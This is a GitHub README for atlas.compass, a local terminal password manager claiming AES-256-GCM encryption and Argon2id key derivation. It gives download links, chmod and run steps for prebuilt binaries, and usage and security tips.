# 🔐 atlas.compass - Simple Secure Terminal Password Manager

[![Download atlas.compass](https://img.shields.io/badge/Download-Atlas.Compass-blue?style=for-the-badge)](https://github.com/kizzycatty/atlas.compass/releases)

## 🛡️ What is atlas.compass?

atlas.compass is a password manager designed for use directly in your computer's terminal. It helps you store and organize your passwords safely on your own device, without sending your data anywhere else. It uses strong encryption methods to keep your information private and secure. 

You control all of your data because passwords are protected with AES-256-GCM encryption and your master key is derived using Argon2id. This means even the software itself can’t read your passwords unless you enter your secret key.

The app’s text-based interface is simple to use and easy to see clearly. atlas.compass works on many computers through a terminal window, making it a lightweight and fast tool without needing a web browser or complex setup.

## 🎯 Main Features

- **Local-Only Storage:** Your passwords are stored on your own machine. No cloud or internet backups unless you set them up yourself.
- **Strong Encryption:** Uses AES-256-GCM, a top standard for encrypting data.
- **Secure Key Derivation:** Argon2id makes guessing your master password very hard for attackers.
- **Clean Terminal Interface:** Easy to navigate using your keyboard.
- **Open Source:** Free to use and review by anyone.
- **Part of Atlas Suite:** Works well if you use other Atlas tools.

## 💻 System Requirements

Before you begin, make sure your computer meets these basic requirements:

- Operating System: Windows 10 or later, macOS 10.14 or later, or Linux (any modern distribution)
- Terminal Application: Command Prompt, PowerShell, Terminal.app, or any standard terminal emulator.
- Minimum 100 MB of free disk space for the program and password database.
- Basic keyboard for navigation.
- No internet connection needed to use after download.

## 🚀 Getting Started

Using atlas.compass does not require programming skills or any special technical background. Follow these steps to download, install, and start managing your passwords.

1. **Download the Application**

   atlas.compass releases are available here:

   [![Download here](https://img.shields.io/badge/Get-atlas.compass%20Release%20Page-blue?style=for-the-badge)](https://github.com/kizzycatty/atlas.compass/releases)

   Visit the page above and choose the correct version for your operating system. The file names will usually include your OS type, such as:

   - `atlas.compass-windows.exe` for Windows
   - `atlas.compass-macos` for macOS
   - `atlas.compass-linux` for Linux

2. **Install or Prepare to Run**

   - On **Windows**, download the `.exe` file and save it to a folder you can remember, such as `Downloads` or `Desktop`.
   - On **macOS and Linux**, download the file, then open your terminal and navigate to where you saved it. You may need to make the file executable by typing:
     ```
     chmod +x atlas.compass-macos
     ```
     or
     ```
     chmod +x atlas.compass-linux
     ```

3. **Open the Terminal**

   Open your computer’s terminal or command prompt:

   - Windows: Search for "cmd" or "PowerShell"
   - macOS: Open "Terminal" from Applications > Utilities
   - Linux: Open your preferred terminal emulator

4. **Run the Application**

   In the terminal, type or paste the path to the file you downloaded and press Enter. For example:

   - Windows:
     ```
     C:\Users\YourName\Downloads\atlas.compass-windows.exe
     ```
   - macOS/Linux:
     ```
     ./atlas.compass-macos
     ```

   The program will start with a text-based menu you can navigate with your keyboard.

5. **Create Your Password Database**

   On first run, atlas.compass will guide you to create a new password vault. You will choose a master password to protect your data. Remember this password carefully as it cannot be recovered.

   The app uses this master password to generate a key with Argon2id and encrypt your data using AES-256-GCM.

6. **Add and Manage Passwords**

   Use the menus and prompts to add new passwords, edit existing ones, or delete entries. The interface uses simple keyboard shortcuts displayed on screen.

## 📥 Download & Install

Visit the official releases page to get the latest version:

[Download atlas.compass](https://github.com/kizzycatty/atlas.compass/releases)

- Choose the correct download file for your operating system.
- Save the file to an easy-to-access folder.
- If needed, set permission to execute the file (macOS and Linux).
- Run the file via terminal and follow on-screen instructions.

## 🔒 Security and Privacy

atlas.compass is designed with user privacy at its core:

- **Zero-Knowledge Encryption:** Your master password and stored data never leave your device.
- **AES-256-GCM:** A strong encryption standard used by governments and enterprises worldwide.
- **Argon2id Key Derivation:** Protects your master password against brute force attacks by making guessing attempts very slow and expensive.
- All password data is stored locally in an encrypted file. No data is shared unless you choose to export it manually.

## 🔧 Troubleshooting

If you have issues running or using atlas.compass, try these suggestions:

- Confirm you downloaded the correct version for your OS.
- On macOS/Linux, ensure you have permission to run the file. Use `chmod +x` if needed.
- Always run the program inside a terminal window.
- Check that your terminal window is set to a readable size and font.
- If the app crashes, reopen the terminal and try running again.
- Use the “Help” option within the app menu for guidance on commands.
- If you still need help, look for support or issues on the GitHub page.

## 💡 Tips for Best Use

- Use a strong and memorable master password.
- Regularly back up your encrypted password file to another secure location.
- Avoid running atlas.compass on shared or public computers.
- Learn and use keyboard shortcuts for quicker navigation.
- Periodically update atlas.compass to get the latest security fixes and improvements.

## 📚 More Information

- Project page and download: https://github.com/kizzycatty/atlas.compass/releases
- Repository topics: aes-256, argon2, atlas-suite, bubbletea, encryption, golang, lipgloss, password-manager, productivity, security, terminal-app, tui, zero-knowledge

---

This guide walks you through getting started with atlas.compass securely and confidently. The tool offers a solid balance of security and usability for managing passwords from the terminal.